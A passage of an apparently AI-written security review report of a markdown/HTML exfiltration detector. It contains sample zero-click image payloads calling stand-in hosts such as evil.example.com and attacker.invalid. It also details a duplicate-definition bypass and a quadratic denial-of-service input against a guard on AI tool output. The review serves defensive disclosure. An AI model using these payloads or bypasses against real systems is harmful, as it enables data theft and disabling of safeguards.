  disagreements, and no cliff at 998 / 999 / 1000 / 1200 / 4096 in any of the three reference forms.
  There is no length bound left in the module for a tenth round to defeat.
- **T72#F-003's cubic and quadratic shapes are gone**; `T72-perf` and `T72-perf2` both report
  `shapesOverOneSecond: []` and `superLinearShapes: []`, and the destination-index + memoisation
  design is sound (both memoised values are functions of the description end alone).
- **T72#F-004 is closed in both directions**: the whole-value mask fires only when decoding reveals a
  boundary the raw bytes lack, offsets stay on raw bytes, and the ordinary per-candidate path is
  byte-unchanged. `isExfilDestination` is a faithful split-out.
- **T72#F-005 is closed at both sites** by one shared `normaliseLabel`, so the two halves cannot drift.
- **Exact matching survived** everywhere I tested; the click-gated controls are still released
  (`ac5PublicLinkReleased: true`, `ac5RelativeReleased: true`, all four link spellings), and
  `allowlistRemedyWorks: true`.
- **Nothing regressed**: eleven matrices byte-identical in four-way agreement, focused suites
  109/0/1110 exit 0, benign corpus 16 files / no new policy id / Part B same 7 ids, and the +2 is
  confined to the repository's own attack fixture and is a correct finding.
- **The viability refutation's decisive axis is correct**, verified at `package.json:59-64` and
  `bun.lock:68` / `:374`.

## Evidence

All raw logs under `/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/`. Probes under
`/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/`
(`T78-perf.ts`, `T78-boundary.ts`, `T78-md.ts`, `T78-dup.ts`, `T78-corpus.ts`).

| Log | SHA-256 |
|---|---|
| `T78-perf.log` | `8d5820afc554b9a634e826841362190d996631ec134ca4ab5a7cdf2c5a5f0115` |
| `T78-boundary.log` | `98a9b3ff20d05b4bead8c3f2c5c65cd03d5185d5c369ade86ff8349107858e3c` |
| `T78-md.log` | `fcdccacc24b8ca1b565fcd8031aafbe71d7e102861f366195483eff94def852a` |
| `T78-dup.log` | `407eceec19ae9fa8facf56879196668797010e931c76f10d94965f15243be089` |
| `T78-corpus.log` | `3fb901e34661d3beb25750dbc125d06a96589bb48e87f03d5a97f2f8ce24881c` |
| `T78-suites.log` | `60ac1a4bec67393a40eebc4d16eecceb1a1909e1368a56707785782ad0b9c2b3` |
| `T78-T53-corpus.log` | `6a56dbea9bf12ceca107e05dc79d21b0ba88e0b4e6cab4773dcb369cb659f3db` |
| `T78-T72-md.log` | `15866b62cdf0475d34dae2b52ce00bedc45d13feb3a66287670edb639ee98837` |
| `T78-T72-md-diff.log` | `78ca07ebd1f36e7032516ad0839e97bce89cafdd4b4b8346cfa1028beb3de213` |
| `T78-T72-boundary.log` | `a17f5cd8ce4c17de19da10a83de116a7491889c0d56e92a420d32559f7ae7639` |
| `T78-T72-gates.log` | `e4d04c18f33619337e7182b055ecc5a792c40b15fe1491e7f5c369b0caf75d68` |
| `T78-T72-srcset.log` | `2e96f8d79ee8d8a4a9b3190781677066cb7e16e71dbdb927d58889a678021000` |
| `T78-T72-doc.log` | `69df9705d0853dabccb91b6cde5d9085fe1262ee737485322d9dfb67139a6433` |
| `T78-T77-doc.log` | `bee363071aa41a1a7b5dd24eab82cd79ef54a550fed73cf14f532bbe259dc718` |
| `T78-T42-exfil-attack.log` | `0646c50821177132e3e84528af5557b609f244fc13f109224de1496f879222ba` (= T66's, T72's, T77's) |
| `T78-T24-recheck2-exfil.log` | `8c9bfec0481cd22957d98f5cd17f4ee37eb9a2c2d1d86bd88593d36bf2abf519` (= T66's, T72's, T77's) |
| `T78-T42-charrefs.log` | `698d88993076fd92aad9b4a4e1f8235a0eac2b7490baa0d34d8d1c65cac1b452` (= T66's, T72's, T77's) |
| `T78-T53-extract.log` | `ad20286ba1aab3f8e810d3c84f6a8610ba96e6362e810b5caf476f50b80834ad` (= T66's, T72's, T77's) |
| `T78-T53-resolve.log` | `0603791031f8f078bf7481c787fc828859306e62f95cc2109bf253c8b53cb2e4` (= T66's, T72's, T77's) |
| `T78-T53-base.log` | `3416d62e56b7674e1208cd0bcb0aa9b3a3484f7baa50612c2819d56d8872254c` (= T72's, T77's) |
| `T78-T53-boundary.log` | `398012ceb8654c55f51235fd5548e0576c3369c7cf8159c251ccb2ff69b3768d` (= T66's, T72's, T77's) |
| `T78-T42-boundary.log` | `7030455d39a56b12e98c75b8a74c699a3d488dbf9d04b4ac060bfe9151f957c8` (= T66's, T72's, T77's) |
| `T78-T24-recheck2-boundary.log` | `838399622c42414f63dbda91cdd9c61dd0b4f83982c630ec1c34f5abeff3064b` (= T66's, T72's, T77's) |
| `T78-T52-base.log` | `a04404db8a1571b102dc21ae85517b3345eb94496553c0fb8bded5811010dff2` (= T66's, T72's, T77's) |
| `T78-T46-surfaces.log` | `d8348c995f7686e16bac791caa429de427d31e02c4ec1b6c8fe6c48e0f959bf8` (= T72's, T77's) |

Constraints honoured: read-only on every production, test and documentation file (start and end hashes
identical, `diff` clean). The only files written are `T78-review.md`, `T78-result.json`, the five
`T78-*.ts` probes, the `T78-*` logs above and the two `.T78-hashes-*.txt` records. Three throwaway
scripts under `/tmp` were removed. No `cd` into `.claude/worktrees/` (two files there were read
read-only, by path, for the corpus check). No git state change of any kind, no flow CLI or state
change, no dependency or lockfile change, no `bun test` without file arguments, no network, no model
call. Every host is reserved or synthetic (`attacker.invalid`, `ok.example.org`, `cdn.example.org`,
`docs.example.org`, `ci.example.com`); nothing was contacted.

## Routing audit

- `graph_used: no (not-relevant)` — the dispatch named the file set exactly, and the graph answers from
  the last `keryx gdgraph build` while this checkout carries a large uncommitted multi-worker change
  set, so a graph answer could not be quoted as current.
- `wiki_used: no (not-relevant)` — the governing texts are the flow artifacts, `policies.md` and the
  frozen `acceptance-criteria.md`; all were read directly as the dispatch required.
- `ctx_used: partial, disclosed` — the `.metaproject/index.md` gate was read first, before any search,
  read or command. Probe and regression EXECUTION ran `bun` directly, because `ctx run`'s compaction
  elides the per-case and per-timing rows that ARE this review's evidence — the same disclosure T46,
  T53, T63, T66, T71, T72 and T77 each made, and the dispatch's own instruction that this project's
  routed path has withheld evidence repeatedly in this phase. Every such invocation carries the
  `# keryx:raw` marker with its reason.
- `raw_rg_used: yes, disclosed and bounded` — three `grep` invocations over project files, each with
  the `# keryx:raw` marker and a stated reason: `marked` in `bun.lock` (the Axis-0 dependency claim
  needs the exact lockfile line, and `RESIDUALS.md` records seven independent cases this phase of the
  routed summary dropping rows silently), a symbol-location sweep in `exfil.ts` (exact line numbers
  are cited in findings), and `ex09` in two fixture copies. `python3`/`sed`/`head` were used only on
  **my own** probe logs, on files I authored, and on schema files that had to be reproduced verbatim
  to author a conforming artifact.

```json keryx:findings
[
  {
    "id": "F-001",
    "global_id": "T78#F-001",
    "reviewer": "T78-independent-review-security-code+review-logic",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 672,
    "symbol": "labelWithinBudget / LabelBudget.maxLength",
    "problem": "T77 removed MAX_REFERENCE_LABEL and replaced it with `nonWhitespaceCount(span) <= maxKeyLength`, where maxKeyLength is the longest key THIS DOCUMENT's own `[ref]: URL` lines produced. The document is the attacker's payload, so the bound that makes the label path cheap is attacker-chosen. When it is 0 the path short-circuits at :779 before slicing — which is the case in every one of the 29 perf shapes T72 and T77 measured. One long definition raises it arbitrarily and every opening bracket whose span passes the O(1) budget test is then sliced, whitespace-collapsed and lowercased at O(span); in a bracket run the spans are O(n) and there are O(n) of them. The cost is paid TWICE, because the inline pass at :1247 also calls readBracketConstructs and discards every reference construct it builds, and the `!` gate that would make that work unnecessary is at :1335, after the work.",
    "impact": "Measured on the shipped detector. Control balancedNest_noDef 200 000 bytes = 49.9 ms; balancedNest_withLongDef 400 029 bytes = 19 037.7 ms, growth exponent 2.00. Also openRunOneClose_withLongDef (1.72) and bangOpenRunOneClose_withLongDef (2.04). At the four public boundaries on ONE 128 029-byte payload: dispatchCallTool 4 332.4 ms, prepareOutputForPersistence 10 865.8 ms, validateOutputForTransport 5 550.2 ms, redactToolOutput 4 042.4 ms — all four over a second. ~90 KB crosses one second; 256 029 bytes costs 21 157.2 ms. The floor is mandatory, cannot be skipped, and the payload is attacker-chosen: denial of service in a security control, and a REGRESSION against the pre-T77 tree where the removed constant bounded this path (T72 measured longLabelUse at 3.1 ms on 400 KB).",
    "suggested_fix": "(a) Move the `!` gate before the work: the inline pass never reads a reference construct and the reference pass discards them for non-image opens, so readBracketConstructs should not build them unless the caller wants them — this alone removes the two `[`-run shapes. (b) Tighten the necessary condition from 'at most maxKeyLength' to 'EXACTLY a length some key has': a span's normalised length is O(1) from two prefix arrays (the existing non-whitespace count plus a count of whitespace-run starts), and a Set of key lengths then admits at most one candidate span per description end instead of all of them. (c) If a shape survives (b), give the label path a per-document work budget proportional to content.length and, when exhausted, FLAG rather than release — a cost bound whose failure direction is a finding. Then add a definition-carrying variant of every existing perf shape to T77-perf.ts; the absence of one is what let this through.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-perf.ts -> shapesOverOneSecond: [balancedNest_withLongDef, openRunOneClose_withLongDef, bangOpenRunOneClose_withLongDef]; superLinearShapes exponents 2.00 / 1.72 / 2.04; matched _noDef controls flat and _shortDef (budget 4) flat at 17.7 ms, which isolates the budget rather than the bracket run as the cause. Raw .metaproject/data/gdctx/raw/T78-perf.log (sha256 8d5820afc554b9a634e826841362190d996631ec134ca4ab5a7cdf2c5a5f0115). Boundaries: bun .../T78-boundary.ts -> boundariesOverOneSecond = all four, with the ladder 8 KB=11.2 ms -> 256 KB=21 157.2 ms; raw T78-boundary.log (sha256 98a9b3ff20d05b4bead8c3f2c5c65cd03d5185d5c369ade86ff8349107858e3c).",
    "confidence": "high",
    "dedupe_key": "exfil-label-budget-attacker-chosen-quadratic-dos",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:672-680 (labelWithinBudget, the O(1) gate)",
        "src/security/detect/exfil.ts:779 (the maxLength === 0 short-circuit that hides the cost in every measured shape)",
        "src/security/detect/exfil.ts:789-807 (the slice + normaliseLabel the budget gates)",
        "src/security/detect/exfil.ts:1247-1253 (the inline pass builds reference constructs it discards)",
        "src/security/detect/exfil.ts:1313-1335 (the `!` gate placed after the work)",
        "src/security/detect/exfil.ts:1182-1201 (maxLabelLength, derived from attacker-supplied REFERENCE_DEF matches)"
      ],
      "enumeration_method": "Every O(1)-gated allocation in the two markdown passes was located by reading readBracketConstructs and both of its callers line by line, and each was asked 'what makes the gate cheap, and is that thing under the attacker's control?'. There is exactly one such gate (LabelBudget) and exactly one thing it is derived from (REFERENCE_DEF matches in the payload). Seven shapes were then scaled across four sizes each with the growth exponent computed per shape, in matched _noDef / _withLongDef / _shortDef triples so the CAUSE is isolated: _shortDef (budget 4) stays flat, which proves the budget rather than the bracket run is the variable."
    }
  },
  {
    "id": "F-002",
    "global_id": "T78#F-002",
    "reviewer": "T78-independent-review-security-code+review-logic",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 1189,
    "symbol": "detectExfil (reference-definition table) / refs.set",
    "problem": "CommonMark: 'If there are several matching definitions, the first one takes precedence.' The detector builds `refs` with Map.set per match, so the LAST definition wins, and the finding's masked span is that last definition's URL. A document defining the same label twice therefore has its SECOND definition masked while a renderer resolves and fetches the FIRST. Neither half is a spelling trick: both are ordinary reference definitions, and the detector does report a finding, so nothing looks wrong to the caller.",
    "impact": "Six spellings measured, all renderer-confirmed with `marked` and all leaking at ALL FOUR public boundaries with attacker.invalid present in the output: shortcut ![a], full ![a][a], collapsed ![a][], a case-differing duplicate ([A]: then [a]:), a whitespace-differing duplicate ([b  c]: then [b c]:, a collision the T72#F-005 fix newly creates) and three definitions. Worse than a plain release: redaction.state is \"redacted\" and isError false at every boundary, so the caller is told the payload was handled while the zero-click destination is still in it. Reachable under the DEFAULT empty allowlist. The control c1SingleDef is closed, so the defect is specific to duplication. Pre-existing — `git show HEAD:src/security/detect/exfil.ts` carries the same refs.set at :99 — so it is a gap eight rounds of enumeration missed, not a T77 regression. It also falsifies policies.md:28's «перечень полный, не пример» for the reference forms.",
    "suggested_fix": "Keep the FIRST definition — `if (!refs.has(ref)) refs.set(ref, { url, start })` — which is both CommonMark's rule and the safe direction, and is one line that no test pins. If over-approximating is preferred instead (a duplicate is itself suspicious), make the table's value a list and push one finding per definition of a label an image use resolves, which closes the class in every renderer rather than only CommonMark-conformant ones. Either way add a duplicate-definition row to T71_CLASS_VECTORS / T77_CLASS_VECTORS, since no boundary regression currently reaches it; maxLabelLength is computed over all definitions and is unaffected.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-md.ts -> bypasses: [dupFirstAttacker, dupFirstAttackerAllowlisted], each printing marked's emitted <img src=\"https://attacker.invalid/p?ctx=CTX\"> beside a redacted output that still contains the attacker host; raw .metaproject/data/gdctx/raw/T78-md.log (sha256 fcdccacc24b8ca1b565fcd8031aafbe71d7e102861f366195483eff94def852a). Boundaries: bun .../T78-dup.ts -> leakingAtAnyBoundary: [d1ShortcutDupDef, d2FullDupDef, d3CollapsedDupDef, d4DupDefCaseSpelling, d5DupDefWhitespaceSpelling, d6ThreeDefs], leakingCount: 6, every row mcpState \"redacted\" with mcpLeaksAttacker/persistLeaksAttacker/transportLeaksAttacker/seamLeaksAttacker true, control c1SingleDef all false; raw T78-dup.log (sha256 407eceec19ae9fa8facf56879196668797010e931c76f10d94965f15243be089).",
    "confidence": "high",
    "dedupe_key": "exfil-duplicate-reference-definition-last-wins-release",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:1183-1192 (the definition table loop, Map.set last-wins)",
        "src/security/detect/exfil.ts:1338-1348 (the single-def lookup and the single finding it pushes)",
        "docs/requirements/keryx-agent-first-core/policies.md:28 (the completeness claim over the three reference spellings)"
      ],
      "enumeration_method": "Every place the detector builds a COLLECTION keyed by attacker-supplied text was enumerated — there is exactly one, `refs` — and each was checked against the corresponding CommonMark or HTML precedence rule for a COLLISION: first-wins, last-wins, or all. The markdown table is last-wins where the standard is first-wins. The HTML side's analogous case, a duplicate attribute, is resolved EAGERLY (any spelling opens the gate — readStartTag's documented over-approximation, T66#F-008), which is the safe direction; the markdown table is the one that is not. Six spellings were then driven through `marked` and all four public boundaries, with a single-definition control."
    }
  },
  {
    "id": "F-003",
    "global_id": "T78#F-003",
    "reviewer": "T78-independent-review-security-code+review-logic",
    "severity": "minor",
    "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T77-implementation.md",
    "line": null,
    "symbol": "Part 3 'The benign corpus' / Concern 4",
    "problem": "T77 states the corpus's two extra findings are the vector `ex09-image-1x1-tracker` (`![ ](https://c2.example-attacker.com/1x1.gif?leak=Y)`), released before because 'a surrounding bracket pair in the JSON made it an image inside a link's description'. Measured: the only span the T77 change newly scans is a link's DESCRIPTION, and no inline construct in the fixture spans ex09 at offset 1757 — every `[` and both of its description ends were enumerated and the count is 0 for both worktree copies. ex09 was already flagged before. The vector that actually changed is the LINE-4 image `https://evil.example.com/collect?d=SECRETDATA`: the JSON array's own `[` at offset 332 resolves, through the first-`]` reading, to an inline LINK whose destination is that URL and whose construct ends at 499, and the image open `![status]` at offset 444 lies inside [332, 499) — exactly the span the pre-T77 code skipped.",
    "impact": "None on any verdict. The count (+2), the two files, the direction and the conclusion ('no ordinary file became a finding, no new benign carrier, no new policy id') are all confirmed by my own run, and the newly flagged finding is a genuine attack vector previously released. Recorded because T77-implementation.md is what the next round inherits as the settled account of the +2, and because the mechanism it states is not what happened: the enclosing construct is one the JSON's array bracket forms with a `]` inside a case string, which is a sharper illustration of context-blind scanning than the narrative gives.",
    "suggested_fix": "Correct the vector name and the mechanism in T77-implementation.md's corpus section and Concern 4. No code change.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T78-corpus.ts -> explanationHolds: false, enclosingInlineConstructsContainingEx09: 0, ex09Start: 1757 for both worktree copies; raw .metaproject/data/gdctx/raw/T78-corpus.log (sha256 3fb901e34661d3beb25750dbc125d06a96589bb48e87f03d5a97f2f8ce24881c). The array-bracket construct: arrayOpen 332 -> constructEnd 499, arrayOpenResolvesTo 'https://evil.example.com/collect?d=SECRETDATA', imageOpensInsideThatConstruct [{at: 444, '![status](https://evil.example.com/collect?d=SECRETDATA) done'}]. Counts: T78-T53-corpus.log (sha256 6a56dbea9bf12ceca107e05dc79d21b0ba88e0b4e6cab4773dcb369cb659f3db; 16 files / 62 findings / Part B 7 ids) against T72-rerun-T53-corpus.log and T77-before-T53-corpus.log (both 16 / 60, both showing the two cases.json copies at 2).",
    "confidence": "high",
    "dedupe_key": "t77-corpus-plus-two-vector-misidentified",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T77-implementation.md (Part 3 'The benign corpus', Concern 4)"
      ],
      "enumeration_method": "The claim was turned into a decidable predicate — the only span T77 newly scans is a link's description, so the explanation holds iff some non-image `[` has open < imageOpen < descriptionEnd — and `descriptionEnds` + `readInlineDestination` were replicated over the fixture's own bytes for every `[` in both worktree copies, rather than trusting the narrative. The actual mechanism was then located by resolving the file's first `[` and enumerating the image opens inside the construct it forms."
    }
  },
  {
    "id": "F-004",
    "global_id": "T78#F-004",
    "reviewer": "T78-independent-review-security-code+review-logic",
    "severity": "minor",
    "file": "docs/requirements/keryx-agent-first-core/policies.md",
    "line": 32,
    "symbol": "Auto-fetch floor: the attribute-gate decoding sentence",
    "problem": "policies.md:32 says the two attribute gates' values are compared after character-reference decoding «как их декодирует renderer» — 'as the renderer decodes them'. A conformant tokenizer decodes an attribute value ONCE. `decodeCharacterReferences` (exfil.ts:256-266) loops to a fixed point (MAX_DECODE_PASSES), which is deliberate and documented for the URL path but also reaches the two gates. Measured: `<input type=\"&amp;#105;mage\" src=…>` and `<meta http-equiv=\"&amp;#114;efresh\" content=…>` are both flagged, and neither opens the gate in any renderer — `&amp;#105;mage` decodes once to the literal text `&#105;mage`.",
    "impact": "Over-approximation, i.e. the safe direction — a masked destination in markup no renderer fetches, no bypass. It matters only because this subsection is the one a reader is told is checkable in both directions, and because the module header at :94-101 presents the gate decoding as renderer-faithful without saying it is multi-pass. T72 measured the same two rows (T72-extra.log doubleEncoded / doubleEncodedMeta, rendererGateOpen=false detectorFindings=1) and did not raise them.",
    "suggested_fix": "State the multi-pass decode in policies.md:32 and in the module header as the deliberate over-approximation it is ('decoded to a fixed point, which is wider than a renderer and errs toward flagging'), or restrict the two gates to a single pass while leaving the URL path's repeat intact. Documentation is the cheaper of the two and matches the floor's current direction.",
    "evidence": "detectExfil returns 1 finding for `<input type=\"&amp;#105;mage\" src=\"https://attacker.invalid/p?ctx=CTX\">` and 1 for the double-encoded `<meta http-equiv=\"&amp;#114;efresh\" …>`; the mechanism is exfil.ts:254-266, whose own comment says 'Bounded repetition so a double-encoded &amp;#58; also resolves'. Cross-checked against T72's recorded rows in T78-T72-extra.log.",
    "confidence": "high",
    "dedupe_key": "exfil-gate-multipass-decode-vs-renderer-faithful-claim",
    "blocking_merge": false,
    "related_skill": "review-security-code",
    "learning_candidate": false,
    "class_scope": {
      "sites": [
        "docs/requirements/keryx-agent-first-core/policies.md:32",
        "src/security/detect/exfil.ts:94-101 (module header, the gate-decoding paragraph)",
        "src/security/detect/exfil.ts:254-266 (decodeCharacterReferences, the bounded repeat)"
      ],
      "enumeration_method": "Every caller of decodeCharacterReferences was enumerated and split into those where multi-pass decoding is a deliberate over-approximation already disclosed (the URL path, renderableUrl, metaRefreshDestination) and those where the normative text claims renderer fidelity (hasAttributeValue's two gates, and the srcset decoded split). The two gates are the members; each was driven with a double-encoded spelling."
    }
  },
  {
    "id": "F-005",
    "global_id": "T78#F-005",
    "reviewer": "T78-independent-review-security-code+review-logic",
    "severity": "info",
    "file": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T77-implementation.md",
    "line": null,
    "symbol": "Part 3 oracle table / Concerns 1-2",
    "problem": "Honesty audit of the two claims the dispatch names. Both are ACCURATE. (1) 'marked cannot confirm the three srcset rows' is stated in the module header (exfil.ts:118-132), in T77-spec.md and in T77-implementation.md's per-question oracle table, which writes 'none in this checkout' where there is no oracle, and cites the exact row (rendererFetchesOnCoveredRows: srcsetDecodedComma=false) rather than merely asserting the limitation. (2) 'nesting beyond one level is over-approximation no oracle can settle' is correct: marked resolves one level, the depth-2..6 rows are flagged deliberately, the direction is toward flagging, and the alternative is the depth bound this file's history argues against. The one thing wider than its evidence is adjacent: the oracle table calls the markdown question 'Settled by measurement', which is true of the rows enumerated but not of the surface — T78#F-002 is a reference-form row no enumeration in eight rounds reached.",
    "impact": "None on any verdict. Recorded so the next round inherits the distinction between 'settled for these rows' and 'settled', which is the distinction T78#F-002 turns on.",
    "suggested_fix": "No action required. When T78#F-002 is fixed, restate the oracle table's markdown row as 'settled for the enumerated rows' and name the enumeration, so a future round does not read it as coverage of the surface.",
    "evidence": "T77-implementation.md Part 3 table and Concerns 1-2 read in full against src/security/detect/exfil.ts:118-132; the srcset behaviour independently confirmed at T78-T72-srcset.log (sha256 2e96f8d79ee8d8a4a9b3190781677066cb7e16e71dbdb927d58889a678021000, all 6 rows verdict=ok) and the nesting direction at T78-md.log rows imageInImageInLink / caseFoldSharpS, where marked and the detector agree on release.",
    "confidence": "high",
    "dedupe_key": "t77-oracle-labelling-audit",
    "blocking_merge": false,
    "related_skill": "review-logic",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T77-implementation.md (Part 3, Concerns 1-2)",
        "src/security/detect/exfil.ts:118-132 (the module header's oracle block)"
      ],
      "enumeration_method": "Every claim in the module and in T77-implementation.md that attributes a conclusion to an oracle was listed and sorted by which oracle it names, then each was checked against what that oracle can observe: marked (rendering, not decoding, not raw HTML), HTMLRewriter/lol-html (attribution and tag boundaries, raw attribute source only, not decoding), timing (no oracle needed), and the spec text (asserted, not measured). Four questions, four answers, all four labelled correctly in the artifact."
    }
  }
]
```
